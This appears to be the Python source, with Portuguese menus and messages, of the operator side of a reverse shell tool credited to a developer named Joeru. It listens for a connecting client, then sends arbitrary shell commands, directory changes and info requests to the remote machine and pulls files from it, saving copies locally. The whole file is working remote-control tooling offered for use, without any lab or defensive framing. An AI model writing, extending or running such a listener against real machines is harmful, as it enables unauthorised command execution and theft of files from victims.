import os
import socket
from colorama import Fore, Back, Style, init
init()

class Cor:

    def __init__(self):
        self.sucesso     = Style.BRIGHT + Back.GREEN + Fore.WHITE
        self.aviso       = Style.BRIGHT + Back.YELLOW + Fore.BLACK
        self.erro        = Style.BRIGHT + Back.RED + Fore.WHITE
        self.inputs      = Style.BRIGHT + Back.CYAN + Fore.WHITE
        self.pagina      = Style.BRIGHT + Back.WHITE + Fore.BLACK
        self.epty        = Style.BRIGHT + Back.WHITE + Fore.BLACK

        self.verde       = Style.BRIGHT + Fore.GREEN
        self.amarelo     = Style.BRIGHT + Fore.YELLOW
        self.vermelho    = Style.BRIGHT + Fore.RED
        self.magenta     = Style.BRIGHT + Fore.MAGENTA

        self.reset       = Style.RESET_ALL

    def Sucesso(self, texto):
        return print(self.sucesso + texto + self.reset)

    def Aviso(self, texto):
        return print(self.aviso + texto + self.reset)

    def Erro(self, texto):
        return print(self.erro + texto + self.reset)

    def Inputs(self, texto):
        return print(self.inputs + texto + self.reset)

    def Mensagem(self, tipo, texto):
        if tipo == 0:
            return print(self.sucesso + '[+]' + self.reset, texto)
        elif tipo == 1:
            return print(self.aviso + '[!]' + self.reset, texto)
        elif tipo == 2:
            return print(self.erro + '[ ): ]' + self.reset, texto)
        elif tipo == 3:
            return print(self.inputs + '[->]' + self.reset, texto)


class Grafico:

    def Menu(self):
        print(Texto.sucesso+'\n|-----ReverseShell-Menu-----|\n|---------------------------|'+Texto.pagina+'\n|  1 - Criar Servidor       |\n|  2 - Info                 |\n|  3 - Sair                 |\n|___________________________|\n'+Texto.reset)

    def Ajuda(self):
        print(Texto.sucesso+"\n|-------------------Help-Menu------------------|\n|----------------------------------------------|"+Texto.pagina+"\n|  limpar         ==  CMD:'CLS' BASH:'CLEAR'   |\n|  infocliente    ==  Informacao do Cliente    |\n|  sair           ==  Fecha Socket             |\n|                                              |\n|  chdir [FOLDER] ==  Troca Diretorio          |\n|  file [FILE]    ==  Obtém Dados do Ficheiro  |\n|______________________________________________|\n"+Texto.reset)


class Servidor_SOCKET:

    SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def __init__(self, InternetProtocol, Porta):
        self.InternetProtocol   = InternetProtocol
        self.Porta              = Porta

    def Preparar_SOCKET(self):
        self.SOCKET.bind((self.InternetProtocol, self.Porta))
        Texto.Mensagem(0,'IP e Porta Binded')
        self.SOCKET.listen(1)
        Texto.Mensagem(1,'A Espera de um Cliente no IPv4: '+self.InternetProtocol+' na Porta: '+str(self.Porta))

    def Comandos(self):
        CLIENTE, ENDERECO   = self.SOCKET.accept()
        Cliente_Endereco    = str(ENDERECO)

        Texto.Mensagem(0,'O Cliente: '+Cliente_Endereco+' entrou no Servidor\n\n\t[help] - Para mais informacao\n')

        while True:

            comando = input('\n'+Texto.verde+'reverseshell'+Texto.amarelo+'@'+Texto.vermelho+ENDERECO[0]+Texto.magenta+'> '+Texto.reset)
            
            if comando != '':

                if 'sair' in comando:
                    CLIENTE.send(str.encode(comando))
                    CLIENTE.close()
                    os.system('clear')
                    break

                elif 'help' in comando:
                    G.Ajuda()

                elif 'limpar' in comando:
                    CLIENTE.send(str.encode(comando))
                    os.system('clear')

                elif 'infocliente' in comando:
                    CLIENTE.send(str.encode(comando))
                    dados_rcv=str(CLIENTE.recv(2048),'utf-8')
                    print('Cliente:',ENDERECO)
                    print(dados_rcv)

                elif 'chdir' in comando:
                    if comando[6:] == '':
                        Texto.Mensagem(2,'chdir [DIRETORIO]')
                    else:
                        CLIENTE.send(str.encode(comando))
                        dados_rcv=str(CLIENTE.recv(2048),'utf-8')

                        if 'DIR_NA' in dados_rcv:
                            Texto.Mensagem(2,'Diretorio Nao Encontrado')
                        elif 'NOT_DIR' in dados_rcv:
                            Texto.Mensagem(2,'Nao e um Diretorio')
                        elif 'OS_ERR' in dados_rcv:
                            Texto.Mensagem(2,'OS_ERR    oof:/')
                        else:
                            print(dados_rcv)

                elif 'file' in comando:
                    if comando[5:] == '':
                        Texto.Mensagem(2,'file [FICHEIRO]')
                    else:
                        ficheiro_nome=comando[5:]
                        CLIENTE.send(str.encode(comando))
                        dados_rcv=str(CLIENTE.recv(),'utf-8')
                        if 'FILE_NF' in dados_rcv:
                            Texto.Mensagem(2,'Ficheiro Nao Encontrado')
                        elif 'NOT_FILE' in dados_rcv:
                            Texto.Mensagem(2,'Sem Permissoes ou Nao e um Ficheiro')
                        else:
                            ficheiro=open('copia_'+ficheiro_nome,'w')
                            ficheiro.write(dados_rcv)
                            ficheiro.close()

                else:
                    CLIENTE.send(str.encode(comando))
                    dados_rcv=str(CLIENTE.recv(2048),'utf-8')
                    print(dados_rcv)
            else:
                pass


Texto=Cor()
G=Grafico()

def main():
    while True:
        G.Menu()
        opcao = str(input('Selecione uma opcao> '))

        if '1' in opcao:
            os.system('clear')
            IP=str(input(Texto.inputs+'[->]'+Texto.reset+' IPv4: '))
            PORTA=int(input(Texto.inputs+'[->]'+Texto.reset+' PORTA: '))
            S=Servidor_SOCKET(IP,PORTA)
            S.Preparar_SOCKET()
            S.Comandos()

        elif '2' in opcao:
            os.system('clear')
            print('Developer: Joeru'+Texto.epty+'<3'+Texto.reset)
            print('Github Profile: https://github.com/Joerito\n')
            os.system('pause')
            os.system('clear')
        elif '3' in opcao:
            break

main()
